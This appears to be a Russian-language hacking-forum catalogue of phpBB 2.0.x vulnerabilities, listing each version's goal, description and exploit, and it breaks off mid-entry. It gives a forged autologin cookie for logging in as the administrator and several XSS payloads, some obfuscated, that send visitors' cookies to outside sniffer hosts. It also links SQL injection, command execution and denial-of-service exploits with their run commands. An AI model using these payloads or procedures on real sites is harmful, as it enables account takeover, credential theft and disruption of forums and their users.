\u0412\u0445\u043e\u0434 \u043d\u0430 \u0444\u043e\u0440\u0443\u043c \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u043e\u043c \u0430\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\u0430.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0414\u043b\u044f \u043d\u0430\u0447\u0430\u043b\u0430 \u043d\u0430\u043c \u0441\u043b\u0435\u0434\u0443\u0435\u0442 \u0437\u0430\u0440\u0435\u0433\u0430\u0442\u044c\u0441\u044f \u043d\u0430 \u0444\u043e\u0440\u0443\u043c\u0435. \u0417\u0430\u0442\u0435\u043c, \u0432\u043e\u0439\u0442\u0438 \u043f\u043e\u0434 \u0441\u0432\u043e\u0438\u043c \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u043e\u043c \u0438 \u0435\u0441\u043b\u0438 \u0441\u0442\u043e\u0438\u0442 \u0433\u0430\u043b\u043a\u0430 \\\"\u0410\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u0432\u0445\u043e\u0434\\\",\u0442\u043e \u0443\u0431\u0440\u0430\u0442\u044c \u0435\u0451. \u041d\u0430\u043c \u043d\u0443\u0436\u043d\u043e \u043e\u0442\u0440\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u0443\u043a\u0438\u0441\u044b (\u043f\u043e\u0441\u043e\u0432\u0435\u0442\u0443\u044e \u0434\u0435\u043b\u0430\u0442\u044c \u044d\u0442\u043e \u0432 \u043e\u043f\u0435\u0440\u0435 Tools-&gt;Advanced-&gt;Cookies),<br>\\n\u0432\u043c\u0435\u0441\u0442\u043e X - \u043d\u0430\u0448 ID ,<br>\\n\u0430 \u043c\u0435\u043d\u044f\u0435\u043c \u043d\u0430 2 - \u043a\u0430\u043a \u0443\u0436\u0435 \u0433\u043e\u0432\u043e\u0440\u0438\u043b\u043e\u0441\u044c \u0432\u044b\u0448\u0435, ID \u0430\u0434\u043c\u0438\u043d\u0430<br>\\nExploit: \\\"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs% 3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D\\\"<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.13<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 hash'a \u043f\u0430\u0440\u043e\u043b\u044f, \u043b\u044e\u0431\u043e\u0433\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 downloads.php. \u0415\u0441\u0442\u044c \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c SQL \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u0438<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/id.php?id=907 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/id.php?id=907]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl &lt;site&gt; &lt;dir&gt; &lt;id&gt;\\\"<br>\\n\u0413\u0434\u0435 &lt;site&gt; URL \u0441\u0430\u0439\u0442\u0430 &lt;dir&gt; - \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f &lt;id&gt; - \u043d\u0443\u0436\u043d\u044b\u0439 \u043d\u0430\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.15<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0418\u043c\u044f,\u041b\u043e\u0433\u0438\u043d\u0430, \u041f\u0430\u0440\u043e\u043b\u044f \u043e\u0442 \u0411\u0414.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u0440\u0438\u0441\u0442\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 viewtopic.php.<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/id.php?id=1080 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/id.php?id=1080]\\n\\t\\t\\t\\t\\t<\/a>]]&gt; \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl &lt;server&gt; &lt;dir&gt; &lt;id&gt; \\\\r\\\\n\\\"<br>\\n\u0413\u0434\u0435 &lt;server&gt; - ip \u0441\u0435\u0440\u0432\u0435\u0440\u0430, &lt;dir&gt; - \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f \u0432 \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0444\u043e\u0440\u0443\u043c &lt;id&gt; \u043d\u043e\u043c\u0435\u0440 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0433\u043e \u0442\u043e\u043f\u0438\u043a\u0430.<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.16<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 hash'a \u043f\u0430\u0440\u043e\u043b\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412 \u0434\u0430\u043d\u043d\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 XSS (Cross Site Scripting \u0431\u043e\u043b\u0435\u0435 \u043f\u043e\u0434\u0440\u043e\u0431\u043d\u043e \u043f\u0440\u043e XSS \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0447\u0438\u0442\u0430\u0442\u044c \u0442\u0443\u0442 ]]&gt;<a>http:\/\/antichat.ru\/txt\/xssoverview\/ [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/antichat.ru\/txt\/xssoverview\/]\\n\\t\\t\\t\\t\\t<\/a>]]&gt; \u0438\u043b\u0438 ]]&gt;<a>http:\/\/ha.ckers.org\/xss.html) [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/ha.ckers.org\/xss.html)]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u0443\u043a\u0438\u0441\u044b. \u041e\u043d\u0438 \u0432\u044b\u0441\u044b\u043b\u0430\u044e\u0442\u0441\u044f \u043d\u0430 \u0441\u043d\u0438\u0444\u0444\u0435\u0440,<br>\\n\u043b\u043e\u0433\u0438 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u0437\u0434\u0435\u0441\u044c ]]&gt;<a>http:\/\/antichat.ru\/sniff\/log.php [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/antichat.ru\/sniff\/log.php]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;.<br>\\nExploit:<br>\\n\\n<pre>[*color=#EFEFEF][*url]www.ut[*url=www.s=''style='font-size:0;color:#EFEFEF'style=\\n'top:exp<b><\/b>ression(eval(this.sss));'sss=`i=new\/**\/Image();i.src='http:\/\/antichat.ru\/cgi-bin\/s.jpg?'\\n+document.cookie;this.sss=null`style='font-size:0;][\/url][\/url]'[\/color]<\/pre>\\n\\n<b>phpBB &lt;= 2.0.16<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: 2.0.16 Installation Path Disclosure<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0440\u0430\u0441\u043a\u0440\u044b\u0442\u0438\u0435 \u0434\u0430\u043d\u043d\u044b\u0445<br>\\nExploit: ]]&gt;<a>http:\/\/someshit.net\/...thread.php?t=71 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/someshit.net\/showthread.php?t=71]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.17<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u0430\u043d\u0434 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0435(php-inj)<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412 \u0434\u0430\u043d\u043d\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 profile.php.<br>\\nExploit: ]]&gt;<a>http:\/\/rst.void.ru\/d...57phpbb2017.txt [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/rst.void.ru\/download\/r57phpbb2017.txt]\\n\\t\\t\\t\\t\\t<\/a>]]&gt; \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl &lt;URL&gt; &lt;cmd&gt;\\\"<br>\\n\u0413\u0434\u0435 &lt;URL&gt; - \u0441\u0441\u044b\u043b\u043a\u0430 \u0434\u043e \u0444\u043e\u0440\u0443\u043c\u0430 \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 ]]&gt;<a>http:\/\/site.com\/phpBB\/ [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/site.com\/phpBB\/]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;, &lt;cmd&gt; - \u043d\u0443\u0436\u043d\u0430\u044f \u043a\u043e\u043c\u0430\u043d\u0434\u0430 (\u043e \u043a\u043e\u043c\u0430\u043d\u0434\u0430\u0445 \u0447\u0438\u0442\u0430\u0435\u043c \u0442\u0443\u0442 ]]&gt;<a>http:\/\/forum.anticha...7345-1-10.html) [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/forum.antichat.ru\/threadnav7345-1-10.html)]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;.<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpbb &lt;= 2.0.18<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438 \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: XSS \u0432 \u0441\u043e\u0431\u0449\u0435\u043d\u0438\u0438<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0442\u0440\u0435\u0431\u0443\u0435\u0442 \u0432\u043a\u043b\u044e\u0447\u0435\u043d\u044b\u0445 BB-\u0442\u044d\u0433\u043e\u0432 \u0438\u043b\u0438 HTML \u043d\u0430 \u0444\u043e\u0440\u0443\u043c\u0435<br>\\nExploit:<br>\\n\\n<pre>&lt;B C=\\\"&gt;\\\" onmouseover=\\\"alert(document.location='http:\/\/HOST\/cookies?'+document.cookie)\\\" X=\\\"&lt;B \\\"&gt; H A L L O &lt;\/B&gt;\\n&lt;B C=\\\"&gt;\\\" ''style='font-size:0;color:#EFEFEF'style='top:exp<b><\/b>ression(eval(this.sss));'sss=`i=\\nnew\/**\/Image();i.src='http:\/\/www.url.com\/cookie\/c.php?c='+document.cookie;this.sss=null`\\nstyle='font-size:0; X=\\\"&lt;B \\\"&gt;'&lt;\/B&gt;[url]http:\/\/www.[url=http:\/\/wj.com\/style=display:none;background:url(java script:alert()) ]wj[\/url][\/url]<\/pre>\\n\\n<b>phpBB &lt;= 2.0.18<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 hash'a \u043f\u0430\u0440\u043e\u043b\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u043d\u0430\u0439\u0434\u0435\u043d\u0430 WJ (White Jordan =)<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412 \u0434\u0430\u043d\u043d\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 XSS.<br>\\nExploit:<br>\\n\\n<pre>[UR*L]http:\/\/www.[U*RL=http:\/\/wj.com\/style=display:none;background&amp;+#58;&amp;+#117;&amp;+#114;&amp;+\\n#108;&amp;+#40;&amp;+#106;&amp;+#97;&amp;+#118;&amp;+#97;\\n&amp;+#115;&amp;+#99;&amp;+#114;&amp;+#105;&amp;+#112;&amp;+#116;&amp;+#58;&amp;+#100;&amp;+#111;&amp;+#99;&amp;+#117;&amp;+#109;&amp;+\\n#101;&amp;+#110;&amp;+#116;&amp;+#46;&amp;+#105;&amp;+#109;&amp;+#97;&amp;+#103;&amp;+#101;&amp;+#115;&amp;+#91;&amp;+#49;&amp;+#93;\\n&amp;+#46;&amp;+#115;&amp;+#114;&amp;+#99;&amp;+#61;&amp;+#34;&amp;+#104;&amp;+#116;&amp;+#116;&amp;+#112;&amp;+#58;&amp;+#47;&amp;+#47;\\n&amp;+#97;&amp;+#110;&amp;+#116;&amp;+#105;&amp;+#99;&amp;+#104;&amp;+#97;&amp;+#116;&amp;+#46;&amp;+#114;&amp;+#117;&amp;+#47;&amp;+\\n#99;&amp;+#103;&amp;+#105;&amp;+#45;&amp;+#98;&amp;+#105;&amp;+#110;&amp;+#47;&amp;+#115;&amp;+#46;&amp;+#106;&amp;+#112;&amp;+#103;\\n&amp;+#63;&amp;+#34;+document.cookie;&amp;+#41;&amp;+#32;]wj[\/*URL][\/*URL]<\/pre>\\n\u0427\u0442\u043e \u0431\u044b \u0432\u043e\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u0441\u043f\u043b\u043e\u0439\u0442\u043e\u043c \u0443\u0431\u0438\u0440\u0430\u0435\u043c \u043f\u043b\u044e\u0441\u044b \u043c\u0435\u0436\u0434\u0443 \u0441\u0438\u043c\u0432\u043e\u043b\u0430\u043c\u0438 &amp; \u0438 #(\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \u0431\u044b\u043b\u043e \\\"&amp;+#40\\\" \u0441\u0442\u0430\u043b\u043e -\\\"&amp;#40\\\")<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.18<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u0434\u043c\u0435\u043d\u0430 \u043d\u0438\u043a\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u043d\u0430\u0439\u0434\u0435\u043d\u0430 Dgoing<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u043f\u043e\u0434\u043c\u0435\u043d\u0430 \u043d\u0438\u043a\u0430, \u043e\u0431\u0445\u043e\u0434 \u0431\u0430\u043d\u0430<br>\\nExploit: ]]&gt;<a>http:\/\/forum.anticha...hread19817.html [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/forum.antichat.ru\/thread19817.html]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpbb &lt;= 2.0.19<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438 \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: XSS \u0432 \u0441\u043e\u0431\u0449\u0435\u043d\u0438\u0438<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0442\u0440\u0435\u0431\u0443\u0435\u0442 \u0432\u043a\u043b\u044e\u0447\u0435\u043d\u044b\u0445 BB-\u0442\u044d\u0433\u043e\u0432 \u0438\u043b\u0438 HTML \u043d\u0430 \u0444\u043e\u0440\u0443\u043c\u0435<br>\\nExploit:<br>\\n\\n<pre>&lt;B C='&gt;' onmouseover='alert(document.location=\\\"http:\/\/antichat.ru\\\"+document.cookie)' X='&lt;B   '&gt; antichat.ru &lt;\/B&gt;\\n[url]http:\/\/www.[email=http:\/\/wj.com\/style=display:none;background:url(java script:alert()) ]wj[\/email][\/url][email=http:\/\/wj.com\/style=display:none;background:url(java script:alert()) ][\/email]<\/pre>\\nphpbb &lt;= 2.0.19<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u043e\u043b\u044f \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: phpBB Style Changer\\\\Viewer MOD SQL injection Exploit<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: sql-inj \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0432 index.php?s=[SQL] \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0439 \u0437\u0430\u043f\u0440\u043e\u0441 \u0432 \u0431\u0434<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/exploits\/1469 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/exploits\/1469]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpbb = 2.0.19<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: DoS \u0444\u043e\u0440\u0443\u043c\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u0437\u0430\u0431\u0430\u043d\u0438\u0442\u044c \u0432\u0441\u0435\u0445 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0430 \u0444\u043e\u0440\u0443\u043c\u0435<br>\\nExploit: ]]&gt;<a>http:\/\/forum.comp-in...hp?threadid=238 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/forum.comp-info.ru\/showthread.php?threadid=238]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpbb &lt;= 2.0.19<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: DoS \u0444\u043e\u0440\u0443\u043c\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: Neo Security Team (\u0430\u0432\u0442\u043e\u0440 - HaCkZaTaN)<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0421\u043f\u043b\u043e\u0438\u0442 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u0443\u0435\u0442 \u043d\u0435\u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043d\u0438\u043a\u043e\u0432 \u0438\u043b\u0438 \u0434\u0435\u043b\u0430\u0435\u0442 \u0447\u0435\u0440\u0435\u0437 \u043f\u043e\u0438\u0441\u043a \u0437\u0430\u043f\u0440\u043e\u0441\u044b, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u0430\u0437\u0430 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0432\u043e\u0441\u043f\u0440\u0438\u043d\u044f\u0442\u044c. \u0421\u043f\u043b\u043e\u0439\u0442 \u0431\u0435\u0441\u0441\u0438\u043b\u0435\u043d \u0442\u0430\u043c, \u0433\u0434\u0435 \u043d\u0430\u0434\u043e \u0432\u0432\u043e\u0434\u0438\u0442\u044c \u043a\u043e\u0434 (\u0432\u0438\u0437\u0443\u0430\u043b\u044c\u043d\u043e\u0435 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435) \u043f\u0440\u0438 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u0438<br>\\nExploit: ]]&gt;<a>http:\/\/www.h4cky0u.o...6-001-phpbb.txt [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/www.h4cky0u.org\/advisories\/HYSA-2006-001-phpbb.txt]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpbb &lt;= 2.0.19<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u043e\u043b\u044f \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u0443\u0434\u0430\u043b\u0435\u043d\u043d\u043e\u043c\u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044e \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0441\u0442\u0438 \u0431\u0440\u0443\u0442-\u0444\u043e\u0440\u0441 \u0430\u0442\u0430\u043a\u0443.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0438\u0437-\u0437\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u0444\u0443\u043d\u043a\u0446\u0438\u044f \\\"gen_rand_string()\\\" \u0433\u0435\u043d\u0435\u0440\u0438\u0440\u0443\u0435\u0442 \u0443\u0433\u0430\u0434\u044b\u0432\u0430\u0435\u043c\u044b\u0435 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0435 \u043d\u043e\u043c\u0435\u0440\u0430. \u0423\u0434\u0430\u043b\u0435\u043d\u043d\u044b\u0439 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0436\u0435\u0442 \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c \u043a \u0446\u0435\u043b\u0435\u0432\u043e\u0439 \u0443\u0447\u0435\u0442\u043d\u043e\u0439 \u0437\u0430\u043f\u0438\u0441\u0438 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b\u0430 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0430\u0440\u043e\u043b\u044f \u043f\u0443\u0442\u0435\u043c \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438 \u0431\u043e\u043b\u044c\u0448\u043e\u0433\u043e \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u0434\u043b\u044f \u043f\u043e\u0434\u0431\u043e\u0440\u0430 Validation ID (\u043d\u0435 \u0431\u043e\u043b\u0435\u0435 1000000 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432). \u0414\u043b\u044f \u0443\u0434\u0430\u0447\u043d\u043e\u0439 \u044d\u043a\u0441\u043f\u043b\u0443\u0430\u0442\u0430\u0446\u0438\u0438 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438 \u0437\u043b\u043e\u0443\u043c\u044b\u0448\u043b\u0435\u043d\u043d\u0438\u043a\u0443 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0437\u043d\u0430\u0442\u044c e-mail \u0446\u0435\u043b\u0435\u0432\u043e\u0439 \u0443\u0447\u0435\u0442\u043d\u043e\u0439 \u0437\u0430\u043f\u0438\u0441\u0438.<br>\\nExploit: ]]&gt;<a>http:\/\/milw0rm.com\/exploits\/1382 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/milw0rm.com\/exploits\/1382]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpbb &lt;= 2.0.20<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: DoS \u0444\u043e\u0440\u0443\u043c\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0431\u0430\u043d\u0438\u0442 \u0432\u0441\u0435 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u044b<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \u0432 \u0444\u043e\u0440\u0443\u043c\u0435 \u0432\u043a\u043b\u044e\u0447\u0435\u043d \u0431\u0430\u043d \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430 \u043f\u0440\u0438 \u0431\u043e\u043b\u0435\u0435 5 \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u044b\u0445 \u043f\u043e\u043f\u044b\u0442\u043e\u043a \u0432\u0445\u043e\u0434\u0430<br>\\nExploit: phpBB 2.0.20 Disable Admin or User Account<br>\\nVideo: -<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.21<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043a\u043e\u043c\u043f\u0440\u043e\u043c\u0435\u0442\u0430\u0446\u0438\u044f \u0441\u0435\u0440\u0432\u0435\u0440\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: obviously you have no output, but this makes phpbb to be like a http proxy<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0430 \u0432 \u043f\u0435\u0440\u0435\u0432\u043e\u0434\u0435 - phpbb \u043c\u043e\u0436\u043d\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043a\u0430\u043a \u043f\u0440\u043e\u043a\u0441\u0438, \u043f\u043e\u0441\u044b\u043b\u0430\u044f 